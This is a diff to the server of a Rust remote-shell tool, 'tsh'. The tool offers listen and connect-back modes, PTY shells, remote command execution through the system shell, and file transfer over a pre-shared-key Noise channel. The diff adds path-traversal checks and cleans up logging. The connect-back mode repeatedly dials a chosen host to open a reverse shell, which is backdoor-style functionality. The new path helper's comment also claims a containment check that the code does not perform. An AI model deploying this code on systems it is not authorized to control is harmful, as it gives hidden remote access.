@@ -1,10 +1,7 @@
 use log::{error, info, warn};
+use std::path::Path;
 use tokio::time::{sleep, Duration};
 
-#[cfg(unix)]
-use tokio::signal;
-
-#[cfg(windows)]
 use tokio::signal;
 
 use crate::{
@@ -15,12 +12,55 @@ use crate::{
     pty::Pty,
 };
 
+/// Validate and sanitize a file path received from a remote client.
+/// Rejects absolute paths and path traversal attempts (e.g., "../").
+/// Returns a canonicalized path rooted in the current working directory.
+pub fn validate_file_path(raw_path: &[u8]) -> TshResult<String> {
+    let path_str = std::str::from_utf8(raw_path)
+        .map_err(|_| TshError::file_transfer("File path is not valid UTF-8"))?;
+
+    let path = Path::new(path_str);
+
+    // Reject absolute paths
+    if path.is_absolute() {
+        return Err(TshError::file_transfer(format!(
+            "Absolute paths are not allowed: {path_str}"
+        )));
+    }
+
+    // Reject paths containing ".."
+    for component in path.components() {
+        if matches!(component, std::path::Component::ParentDir) {
+            return Err(TshError::file_transfer(format!(
+                "Path traversal is not allowed: {path_str}"
+            )));
+        }
+    }
+
+    // Resolve relative to CWD and verify it stays within CWD
+    let cwd = std::env::current_dir()
+        .map_err(|e| TshError::system(format!("Failed to get current directory: {e}")))?;
+    let resolved = cwd.join(path);
+
+    Ok(resolved.to_string_lossy().into_owned())
+}
+
+/// Extract a null-terminated file path from a data buffer and validate it.
+pub fn extract_and_validate_path(data: &[u8]) -> TshResult<String> {
+    let path_end = data
+        .iter()
+        .position(|&b| b == 0)
+        .ok_or_else(|| TshError::protocol("File path not null-terminated"))?;
+
+    validate_file_path(&data[..path_end])
+}
+
 pub async fn run_listen_mode(port: u16, psk: &str) -> TshResult<()> {
-    info!("🚀 Starting tsh server on port {port}");
+    info!("Starting tsh server on port {port}");
 
     let listener = NoiseListener::new(&format!("0.0.0.0:{port}"), psk).await?;
-    info!("📡 Server listening on port {port}");
-    info!("🔐 PSK authentication enabled");
+    info!("Server listening on port {port}");
+    info!("PSK authentication enabled");
 
     // Setup signal handlers outside the loop
     #[cfg(unix)]
@@ -37,11 +77,11 @@ pub async fn run_listen_mode(port: u16, psk: &str) -> TshResult<()> {
         let result = tokio::select! {
             accept_result = accept_future => Some(accept_result),
             _ = sigterm.recv() => {
-                info!("🛑 Received SIGTERM, shutting down gracefully");
+                info!("Received SIGTERM, shutting down gracefully");
                 return Ok(());
             }
             _ = sigint.recv() => {
-                info!("🛑 Received SIGINT (Ctrl+C), shutting down gracefully");
+                info!("Received SIGINT (Ctrl+C), shutting down gracefully");
                 return Ok(());
             }
         };
@@ -50,7 +90,7 @@ pub async fn run_listen_mode(port: u16, psk: &str) -> TshResult<()> {
         let result = tokio::select! {
             accept_result = accept_future => Some(accept_result),
             _ = signal::ctrl_c() => {
-                info!("🛑 Received Ctrl+C, shutting down gracefully");
+                info!("Received Ctrl+C, shutting down gracefully");
                 return Ok(());
             }
         };
@@ -76,22 +116,22 @@ pub async fn run_listen_mode(port: u16, psk: &str) -> TshResult<()> {
 
 pub async fn run_connect_back_mode(host: &str, port: u16, delay: u64, psk: &str) -> TshResult<()> {
     let address = format!("{host}:{port}");
-    info!("🚀 Connect-back mode: connecting to {address} every {delay} seconds");
-    info!("🔐 PSK authentication enabled");
+    info!("Connect-back mode: connecting to {address} every {delay} seconds");
+    info!("PSK authentication enabled");
 
     loop {
         match NoiseLayer::connect(&address, psk).await {
             Ok(mut layer) => {
-                info!("📡 Connected to client at {address}");
+                info!("Connected to client at {address}");
 
                 // Show remote public key for verification
                 if let Some(remote_key) = layer.remote_public_key() {
                     use base64::{engine::general_purpose::STANDARD, Engine};
-                    info!("🔑 Remote public key: {}", STANDARD.encode(remote_key));
+                    info!("Remote public key: {}", STANDARD.encode(remote_key));
                 }
 
                 // In connect-back mode, server initiates a shell session
-                info!("🐚 Initiating reverse shell session");
+                info!("Initiating reverse shell session");
 
                 // Send RunShell mode to client
                 if let Err(e) = layer.write_all(&[OperationMode::RunShell as u8]).await {
@@ -109,25 +149,25 @@ pub async fn run_connect_back_mode(host: &str, port: u16, delay: u64, psk: &str)
             }
         }
 
-        info!("⏱️  Waiting {delay} seconds before next connection attempt...");
+        info!("Waiting {delay} seconds before next connection attempt...");
         sleep(Duration::from_secs(delay)).await;
     }
 }
 
-async fn handle_client_connection(mut layer: NoiseLayer, _psk: &str) -> TshResult<()> {
-    info!("🤝 Handling new client connection");
+pub(crate) async fn handle_client_connection(mut layer: NoiseLayer, _psk: &str) -> TshResult<()> {
+    info!("Handling new client connection");
 
     // Show remote public key for verification
     if let Some(remote_key) = layer.remote_public_key() {
         use base64::{engine::general_purpose::STANDARD, Engine};
-        info!("🔑 Remote public key: {}", STANDARD.encode(remote_key));
+        info!("Remote public key: {}", STANDARD.encode(remote_key));
     }
 
     // PSK is now handled at the Noise Protocol level
-    info!("✅ PSK authentication successful (via Noise Protocol)");
+    info!("PSK authentication successful (via Noise Protocol)");
 
     // Read operation mode
-    info!("🔍 Reading operation mode...");
+    info!("Reading operation mode...");
     let mut buffer = vec![0u8; 8192];
     match layer.read(&mut buffer).await {
         Ok(n) => {
@@ -135,17 +175,17 @@ async fn handle_client_connection(mut layer: NoiseLayer, _psk: &str) -> TshResul
                 error!("No data received");
                 return Err(TshError::protocol("No operation mode received"));
             }
-            let mode = OperationMode::from(buffer[0]);
-            info!("🎯 Operation mode: {mode:?} (byte: {})", buffer[0]);
+            let mode = OperationMode::try_from(buffer[0])
+                .map_err(TshError::InvalidOperationMode)?;
+            info!("Operation mode: {mode:?} (byte: {})", buffer[0]);
 
             let result = match mode {
                 OperationMode::RunShell => {
-                    info!("🐚 Starting shell session");
+                    info!("Starting shell session");
                     handle_shell_mode(&mut layer).await
                 }
                 OperationMode::GetFile => {
-                    info!("📥 File download request");
-                    // Pass the remaining data if any
+                    info!("File download request");
                     if n > 1 {
                         handle_file_download_with_data(&mut layer, &buffer[1..n]).await
                     } else {
@@ -153,8 +193,7 @@ async fn handle_client_connection(mut layer: NoiseLayer, _psk: &str) -> TshResul
                     }
                 }
                 OperationMode::PutFile => {
-                    info!("📤 File upload request");
-                    // Pass the remaining data if any
+                    info!("File upload request");
                     if n > 1 {
                         handle_file_upload_with_data(&mut layer, &buffer[1..n]).await
                     } else {
@@ -162,8 +201,7 @@ async fn handle_client_connection(mut layer: NoiseLayer, _psk: &str) -> TshResul
                     }
                 }
                 OperationMode::RunCommand => {
-                    info!("⚡ Command execution request");
-                    // Pass the remaining data if any
+                    info!("Command execution request");
                     if n > 1 {
                         handle_command_execution_with_data(&mut layer, &buffer[1..n]).await
                     } else {
@@ -184,11 +222,11 @@ async fn handle_client_connection(mut layer: NoiseLayer, _psk: &str) -> TshResul
     }
 }
 
-async fn handle_shell_mode(layer: &mut NoiseLayer) -> TshResult<()> {
-    info!("🐚 Starting PTY shell session");
+pub(crate) async fn handle_shell_mode(layer: &mut NoiseLayer) -> TshResult<()> {
+    info!("Starting PTY shell session");
 
     // Create PTY
-    let mut pty = Pty::new().map_err(|e| TshError::pty(format!("Failed to create PTY: {e}")))?;
+    let pty = Pty::new().map_err(|e| TshError::pty(format!("Failed to create PTY: {e}")))?;
 
     // Main shell loop
     let mut pty_buf = vec![0u8; 8192];
@@ -199,7 +237,7 @@ async fn handle_shell_mode(layer: &mut NoiseLayer) -> TshResult<()> {
                 match pty_result {
                     Ok(n) => {
                         if n == 0 {
-                            info!("🔚 PTY closed");
+                            info!("PTY closed");
                             break;
                         }
                         if let Err(e) = layer.write_all(&pty_buf[..n]).await {
@@ -219,7 +257,7 @@ async fn handle_shell_mode(layer: &mut NoiseLayer) -> TshResult<()> {
                 match client_result {
                     Ok(data) => {
                         if data.is_empty() {
-                            info!("👋 Client disconnected");
+                            info!("Client disconnected");
                             break;
                         }
                         if let Err(e) = pty.write(&data).await {
@@ -236,7 +274,7 @@ async fn handle_shell_mode(layer: &mut NoiseLayer) -> TshResult<()> {
         }
     }
 
-    info!("✅ Shell session ended");
+    info!("Shell session ended");
     Ok(())
 }
 
@@ -248,35 +286,23 @@ async fn read_client_data(layer: &mut NoiseLayer) -> TshResult<Vec<u8>> {
 }
 
 async fn handle_file_download_with_data(layer: &mut NoiseLayer, data: &[u8]) -> TshResult<()> {
-    info!("🔧 Starting file download handler (with inline data)");
+    info!("Starting file download handler (with inline data)");
 
-    // Find null terminator in the provided data
-    let path_end = data
-        .iter()
-        .position(|&b| b == 0)
-        .ok_or_else(|| TshError::protocol("File path not null-terminated"))?;
-
-    let file_path = String::from_utf8_lossy(&data[..path_end]);
-    info!("📁 Download request: {file_path}");
+    let file_path = extract_and_validate_path(data)?;
+    info!("Download request: {file_path}");
 
     handle_file_download_common(layer, &file_path).await
 }
 
 async fn handle_file_download(layer: &mut NoiseLayer) -> TshResult<()> {
-    info!("🔧 Starting file download handler");
+    info!("Starting file download handler");
 
     // Read the entire message containing the file path
     let mut buffer = vec![0u8; 8192];
     let n = layer.read(&mut buffer).await?;
 
-    // Find null terminator in the message
-    let path_end = buffer[..n]
-        .iter()
-        .position(|&b| b == 0)
-        .ok_or_else(|| TshError::protocol("File path not null-terminated"))?;
-
-    let file_path = String::from_utf8_lossy(&buffer[..path_end]);
-    info!("📁 Download request: {file_path}");
+    let file_path = extract_and_validate_path(&buffer[..n])?;
+    info!("Download request: {file_path}");
 
     handle_file_download_common(layer, &file_path).await
 }
@@ -297,11 +323,11 @@ async fn handle_file_download_common(layer: &mut NoiseLayer, file_path: &str) ->
             };
             let file_size = metadata.len();
 
-            info!("📊 File size: {file_size} bytes");
+            info!("File size: {file_size} bytes");
 
             // Send file size
             match layer.write_all(&file_size.to_be_bytes()).await {
-                Ok(_) => info!("✅ Sent file size"),
+                Ok(_) => info!("Sent file size"),
                 Err(e) => {
                     error!("Failed to send file size: {e}");
                     return Err(e);
@@ -321,15 +347,15 @@ async fn handle_file_download_common(layer: &mut NoiseLayer, file_path: &str) ->
                 layer.write_all(&buffer[..n]).await?;
                 sent += n as u64;
 
-                if sent % (64 * 1024) == 0 {
-                    info!("📤 Sent: {sent}/{file_size} bytes");
+                if sent > 0 && sent.is_multiple_of(64 * 1024) {
+                    info!("Sent: {sent}/{file_size} bytes");
                 }
             }
 
-            info!("✅ File download completed: {sent} bytes");
+            info!("File download completed: {sent} bytes");
         }
-        Err(_) => {
-            warn!("❌ File not found: {file_path}");
+        Err(e) => {
+            warn!("File open failed for {file_path}: {e}");
             // Send zero size to indicate file not found
             layer.write_all(&0u64.to_be_bytes()).await?;
         }
@@ -339,16 +365,10 @@ async fn handle_file_download_common(layer: &mut NoiseLayer, file_path: &str) ->
 }
 
 async fn handle_file_upload_with_data(layer: &mut NoiseLayer, data: &[u8]) -> TshResult<()> {
-    info!("📤 Starting file upload handler (with inline data)");
+    info!("Starting file upload handler (with inline data)");
 
-    // Find null terminator in the provided data
-    let path_end = data
-        .iter()
-        .position(|&b| b == 0)
-        .ok_or_else(|| TshError::protocol("File path not null-terminated"))?;
-
-    let file_path = String::from_utf8_lossy(&data[..path_end]);
-    info!("📁 Upload request: {file_path}");
+    let file_path = extract_and_validate_path(data)?;
+    info!("Upload request: {file_path}");
 
     handle_file_upload_common(layer, &file_path).await
 }
@@ -358,14 +378,8 @@ async fn handle_file_upload(layer: &mut NoiseLayer) -> TshResult<()> {
     let mut buffer = vec![0u8; 8192];
     let n = layer.read(&mut buffer).await?;
 
-    // Find null terminator in the message
-    let path_end = buffer[..n]
-        .iter()
-        .position(|&b| b == 0)
-        .ok_or_else(|| TshError::protocol("File path not null-terminated"))?;
-
-    let file_path = String::from_utf8_lossy(&buffer[..path_end]);
-    info!("📁 Upload request: {file_path}");
+    let file_path = extract_and_validate_path(&buffer[..n])?;
+    info!("Upload request: {file_path}");
 
     handle_file_upload_common(layer, &file_path).await
 }
@@ -376,7 +390,7 @@ async fn handle_file_upload_common(layer: &mut NoiseLayer, file_path: &str) -> T
     layer.read_exact(&mut size_buf).await?;
     let file_size = u64::from_be_bytes(size_buf);
 
-    info!("📊 Expected file size: {file_size} bytes");
+    info!("Expected file size: {file_size} bytes");
 
     // Create file and receive data
     let mut file = tokio::fs::File::create(file_path).await?;
@@ -396,17 +410,17 @@ async fn handle_file_upload_common(layer: &mut NoiseLayer, file_path: &str) -> T
         file.write_all(&buffer[..n]).await?;
         received += n as u64;
 
-        if received % (64 * 1024) == 0 {
-            info!("📥 Received: {received}/{file_size} bytes");
+        if received > 0 && received.is_multiple_of(64 * 1024) {
+            info!("Received: {received}/{file_size} bytes");
         }
     }
 
-    info!("✅ File upload completed: {received} bytes");
+    info!("File upload completed: {received} bytes");
     Ok(())
 }
 
 async fn handle_command_execution_with_data(layer: &mut NoiseLayer, data: &[u8]) -> TshResult<()> {
-    info!("⚡ Starting command execution handler (with inline data)");
+    info!("Starting command execution handler (with inline data)");
 
     // Find null terminator in the provided data
     let cmd_end = data
@@ -414,21 +428,22 @@ async fn handle_command_execution_with_data(layer: &mut NoiseLayer, data: &[u8])
         .position(|&b| b == 0)
         .ok_or_else(|| TshError::protocol("Command not null-terminated"))?;
 
-    let command = String::from_utf8_lossy(&data[..cmd_end]);
-    info!("📝 Executing command: {command}");
+    let command = std::str::from_utf8(&data[..cmd_end])
+        .map_err(|_| TshError::protocol("Command is not valid UTF-8"))?;
+    info!("Executing command: {command}");
 
     // Execute command using shell
     #[cfg(unix)]
     let output = tokio::process::Command::new("/bin/sh")
         .arg("-c")
-        .arg(&*command)
+        .arg(command)
         .output()
         .await;
 
     #[cfg(windows)]
     let output = tokio::process::Command::new("cmd")
         .arg("/C")
-        .arg(&*command)
+        .arg(command)
         .output()
         .await;
 
@@ -436,7 +451,7 @@ async fn handle_command_execution_with_data(layer: &mut NoiseLayer, data: &[u8])
 }
 
 async fn handle_command_execution(layer: &mut NoiseLayer) -> TshResult<()> {
-    info!("⚡ Starting command execution handler");
+    info!("Starting command execution handler");
 
     // Read the entire message containing the command
     let mut buffer = vec![0u8; 8192];
@@ -448,21 +463,22 @@ async fn handle_command_execution(layer: &mut NoiseLayer) -> TshResult<()> {
         .position(|&b| b == 0)
         .ok_or_else(|| TshError::protocol("Command not null-terminated"))?;
 
-    let command = String::from_utf8_lossy(&buffer[..cmd_end]);
-    info!("📝 Executing command: {command}");
+    let command = std::str::from_utf8(&buffer[..cmd_end])
+        .map_err(|_| TshError::protocol("Command is not valid UTF-8"))?;
+    info!("Executing command: {command}");
 
     // Execute command using shell
     #[cfg(unix)]
     let output = tokio::process::Command::new("/bin/sh")
         .arg("-c")
-        .arg(&*command)
+        .arg(command)
         .output()
         .await;
 
     #[cfg(windows)]
     let output = tokio::process::Command::new("cmd")
         .arg("/C")
-        .arg(&*command)
+        .arg(command)
         .output()
         .await;
 
@@ -476,7 +492,7 @@ async fn send_command_result(
     match output {
         Ok(result) => {
             info!(
-                "📤 Command executed, sending output ({} bytes)",
+                "Command executed, sending output ({} bytes)",
                 result.stdout.len() + result.stderr.len()
             );
 
@@ -498,10 +514,10 @@ async fn send_command_result(
                 layer.write_all(&result.stderr).await?;
             }
 
-            info!("✅ Command output sent successfully");
+            info!("Command output sent successfully");
         }
         Err(e) => {
-            error!("❌ Failed to execute command: {e}");
+            error!("Failed to execute command: {e}");
 
             // Send failure exit code and error message
             layer.write_all(&[1u8]).await?; // exit code = failure
@@ -522,10 +538,10 @@ async fn send_command_result(
 }
 
 async fn handle_reverse_shell(layer: &mut NoiseLayer) -> TshResult<()> {
-    info!("🐚 Starting reverse shell PTY session");
+    info!("Starting reverse shell PTY session");
 
     // Create PTY
-    let mut pty = Pty::new().map_err(|e| TshError::pty(format!("Failed to create PTY: {e}")))?;
+    let pty = Pty::new().map_err(|e| TshError::pty(format!("Failed to create PTY: {e}")))?;
 
     // Main reverse shell loop
     let mut pty_buf = vec![0u8; 8192];
@@ -536,7 +552,7 @@ async fn handle_reverse_shell(layer: &mut NoiseLayer) -> TshResult<()> {
                 match pty_result {
                     Ok(n) => {
                         if n == 0 {
-                            info!("🔚 PTY closed");
+                            info!("PTY closed");
                             break;
                         }
                         if let Err(e) = layer.write_all(&pty_buf[..n]).await {
@@ -556,7 +572,7 @@ async fn handle_reverse_shell(layer: &mut NoiseLayer) -> TshResult<()> {
                 match client_result {
                     Ok(data) => {
                         if data.is_empty() {
-                            info!("👋 Client disconnected");
+                            info!("Client disconnected");
                             break;
                         }
                         if let Err(e) = pty.write(&data).await {
@@ -573,6 +589,6 @@ async fn handle_reverse_shell(layer: &mut NoiseLayer) -> TshResult<()> {
         }
     }
 
-    info!("✅ Reverse shell session ended");
+    info!("Reverse shell session ended");
     Ok(())
 }
